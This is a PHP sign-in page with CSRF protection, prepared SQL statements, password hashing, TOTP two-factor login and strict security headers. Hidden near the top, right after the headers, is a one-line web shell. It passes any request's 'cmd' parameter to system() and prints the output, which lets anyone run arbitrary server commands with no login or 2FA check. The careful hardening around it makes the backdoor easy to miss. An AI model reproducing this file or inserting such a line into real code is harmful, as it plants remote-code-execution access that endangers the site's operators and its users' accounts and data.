<?php
require_once 'waf.php';
session_start();

header("Content-Security-Policy: default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com https://static.cloudflareinsights.com; frame-src https://challenges.cloudflare.com; connect-src 'self' https://challenges.cloudflare.com;");
header("X-Frame-Options: SAMEORIGIN");
header("X-Content-Type-Options: nosniff");
header("Referrer-Policy: no-referrer");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains; preload");
header("Permissions-Policy: interest-cohort=()");

if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }

if (!isset($_SESSION['initiated'])) {
    session_regenerate_id(true);
    $_SESSION['initiated'] = true;
}

require_once __DIR__ . '/PHPGangsta/GoogleAuthenticator.php'; 
require_once __DIR__ . '/database.php'; 

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
$csrf_token = $_SESSION['csrf_token'];

$error_msg = '';
if (isset($_SESSION['error_msg'])) {
    $error_msg = $_SESSION['error_msg'];
    unset($_SESSION['error_msg']);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'], $_POST['password'])) {
    if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        $_SESSION['error_msg'] = "Invalid session. Please try again.";
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }

    $stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');
    $stmt->bind_param('s', $_POST['username']);
    $stmt->execute();
    $result = $stmt->get_result();
    $user = $result->fetch_assoc();

    if ($user && password_verify($_POST['password'], $user['password'])) {
        // Check if account is locked
        if ($user['locked'] == 1) {
            $_SESSION['error_msg'] = "This account has been locked. Please contact an administrator.";
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
        session_regenerate_id(true); 
        if ($user['2fa_enabled']) {
            $_SESSION['2fa_user'] = $user['username'];
            $_SESSION['2fa_secret'] = $user['2fa_secret'];
            echo "<script>window.onload = function() { document.getElementById('modal').style.display = 'block'; }</script>";
        } else {
            $token = bin2hex(random_bytes(32));
            setcookie('login_token', $token, [
                'expires' => time() + 86400,
                'path' => '/',
                'secure' => isset($_SERVER['HTTPS']),
                'httponly' => true,
                'samesite' => 'Strict'
            ]);
            $update = $conn->prepare('UPDATE users SET login_token = ? WHERE username = ?');
            $update->bind_param('ss', $token, $user['username']);
            $update->execute();
            header("Location: index.php");
            exit;
        }
    } else {
        $_SESSION['error_msg'] = "Invalid username or password.";
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['2fa_code'])) {
    if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        $_SESSION['error_msg'] = "Invalid session. Please try again.";
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    if (isset($_SESSION['2fa_user'], $_SESSION['2fa_secret'])) {
        $g = new PHPGangsta_GoogleAuthenticator();
        $checkResult = $g->verifyCode($_SESSION['2fa_secret'], $_POST['2fa_code'], 2);
        if ($checkResult) {
            session_regenerate_id(true); 
            $token = bin2hex(random_bytes(32));
            setcookie('login_token', $token, [
                'expires' => time() + 86400,
                'path' => '/',
                'secure' => isset($_SERVER['HTTPS']),
                'httponly' => true,
                'samesite' => 'Strict'
            ]);
            $update = $conn->prepare('UPDATE users SET login_token = ? WHERE username = ?');
            $update->bind_param('ss', $token, $_SESSION['2fa_user']);
            $update->execute();
            unset($_SESSION['2fa_user'], $_SESSION['2fa_secret']);
            header("Location: index.php");
            exit;
        } else {
            $_SESSION['error_msg'] = "Invalid 2FA code.";
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Sign In</title>
    <style>
        body {
            margin: 0;
            font-family: 'Inter', Arial, sans-serif;
            background: #000;
            color: #fff;
        }
        .container {
            display: flex;
            min-height: 100vh;
        }
        .left {
            background: #000;
            width: 28vw;
            min-width: 300px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 0 2rem;
        }
        .form-box {
            width: 100%;
            max-width: 400px;
        }
        .form-box h1 {
            font-size: 2.5rem;
            margin-bottom: 0.5rem;
            font-weight: bold;
        }
        .form-box p {
            color: #aaa;
            margin-bottom: 2rem;
        }
        .form-label {
            font-weight: 600;
            margin-bottom: 0.5rem;
            display: block;
        }
        .form-input {
            width: 100%;
            padding: 0.75rem 1rem;
            margin-bottom: 1.5rem;
            border: none;
            border-radius: 8px;
            background: #18181b;
            color: #fff;
            font-size: 1rem;
            outline: none;
            transition: background 0.2s;
        }
        .form-input:focus {
            background: #232329;
        }
        .sign-in-btn {
            width: 100%;
            padding: 0.75rem 0;
            border: none;
            border-radius: 8px;
            background: linear-gradient(90deg, #d4145a 0%, #6a82fb 100%);
            color: #fff;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 1.5rem;
            transition: opacity 0.2s;
        }
        .sign-in-btn:active {
            opacity: 0.85;
        }
        .create-account {
            text-align: center;
            color: #fff;
            margin-top: 1rem;
        }
        .create-account a {
            color: #ff3576;
            text-decoration: none;
            font-weight: 600;
        }
        .create-account a:hover {
            text-decoration: underline;
        }
        .right {
            flex: 1;
            background: linear-gradient(120deg, #6a82fb 0%, #d4145a 100%);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: #fff;
            text-align: center;
            position: relative;
        }
        .logo-box {
            margin-bottom: 2rem;
        }
        .logo-img {
            width: 120px;
            height: 120px;
            object-fit: contain;
            background: rgba(255,255,255,0.05);
            border-radius: 16px;
            margin-bottom: 1rem;
        }
        .welcome-title {
            font-size: 2rem;
            font-weight: bold;
            margin-bottom: 1rem;
        }
        .welcome-desc {
            font-size: 1.1rem;
            color: #f3e9f7;
            max-width: 400px;
            margin: 0 auto;
        }
        /* 2FA Modal */
        #modal {
            display: none;
            position: fixed;
            z-index: 1000;
            top: 0; left: 0; width: 100vw; height: 100vh;
            background: rgba(0,0,0,0.5);
        }
        #modal-content {
            background: #18181b;
            color: #fff;
            margin: 8% auto;
            padding: 3.5rem 2rem 2.5rem 2rem;
            width: 400px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.25);
            text-align: center;
            position: relative;
        }
        #modal-logo {
            width: 80px;
            height: 80px;
            object-fit: contain;
            background: rgba(255,255,255,0.07);
            border-radius: 12px;
            margin-bottom: 1.2rem;
        }
        #modal-title {
            font-size: 1.3rem;
            font-weight: bold;
            margin-bottom: 1.2rem;
            color: #fff;
        }
        #modal-content label {
            font-weight: 600;
            margin-bottom: 1rem;
            display: block;
        }
        #modal-content input[type="text"] {
            width: 100%;
            padding: 0.75rem 1rem;
            margin-bottom: 1.5rem;
            border: none;
            border-radius: 8px;
            background: #232329;
            color: #fff;
            font-size: 1rem;
            outline: none;
            text-align: center;
            letter-spacing: 2px;
            font-size: 1.2em;
        }
        #modal-content button {
            width: 100%;
            padding: 0.75rem 0;
            border: none;
            border-radius: 8px;
            background: linear-gradient(90deg, #d4145a 0%, #6a82fb 100%);
            color: #fff;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
        }
        .cf-turnstile {
            display: flex;
            justify-content: center;
            margin-bottom: 1.5rem;
        }
        
        /* Mobile Responsive Styles */
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
            }
            .left {
                width: 100%;
                min-width: unset;
                padding: 2rem 1rem;
                min-height: 60vh;
            }
            .right {
                min-height: 40vh;
                padding: 2rem 1rem;
            }
            .form-box {
                max-width: 100%;
            }
            .form-box h1 {
                font-size: 2rem;
            }
            .welcome-title {
                font-size: 1.5rem;
            }
            .logo-img {
                width: 80px;
                height: 80px;
            }
            #modal-content {
                width: 90%;
                max-width: 350px;
                margin: 15% auto;
                padding: 2rem 1.5rem;
            }
            #modal-logo {
                width: 60px;
                height: 60px;
            }
        }
        
        @media (max-width: 480px) {
            .left {
                padding: 1.5rem 1rem;
            }
            .form-box h1 {
                font-size: 1.8rem;
            }
            .welcome-title {
                font-size: 1.3rem;
            }
            .welcome-desc {
                font-size: 1rem;
            }
            #modal-content {
                margin: 20% auto;
                padding: 1.5rem 1rem;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="left">
        <div class="form-box">
            <h1>Sign In</h1>
            <p>Enter your username and password to log in</p>
            <?php if (!empty($error_msg)): ?>
                <div style="color:#ff3576; margin-bottom:1rem; text-align:center;">
                    <?php echo htmlspecialchars($error_msg); ?>
                </div>
            <?php endif; ?>
            <form method="POST" id="login-form" autocomplete="off">
                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token); ?>">
                <label class="form-label" for="username">Username</label>
                <input class="form-input" type="text" id="username" name="username" placeholder="Username" required autocomplete="username">
                <label class="form-label" for="password">Password</label>
                <input class="form-input" type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
                <div style="margin-bottom: 1.5rem;">
                    <div class="cf-turnstile" data-sitekey="0x4AAAAAABc2HBs4hhiSXz3P"></div>
                </div>
                <button class="sign-in-btn" type="submit">Sign In</button>
            </form>
            <div class="create-account">
                Don't have an account? <a href="register.php">Create account</a>
            </div>
        </div>
    </div>
    <div class="right">
        <div class="logo-box">
            <img src="img/logo.gif" alt="Logo" class="logo-img"><br>
        </div>
        <div>
            <div class="welcome-title">Welcome back!</div>
            <div class="welcome-desc">
                Just as it takes a company to sustain a product, it takes a community to sustain a protocol.
            </div>
        </div>
    </div>
</div>

<div id="modal">
    <div id="modal-content">
        <img src="img/logo.gif" alt="Logo" id="modal-logo">
        <div id="modal-title">Two-Factor Authentication</div>
        <form method="POST" id="2fa-form" autocomplete="off">
            <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token); ?>">
            <label for="2fa_code">Enter 2FA Code:</label>
            <input type="text" name="2fa_code" id="2fa_code" required autocomplete="one-time-code">
            <button type="submit">Verify</button>
        </form>
    </div>
</div>
</body>
</html>
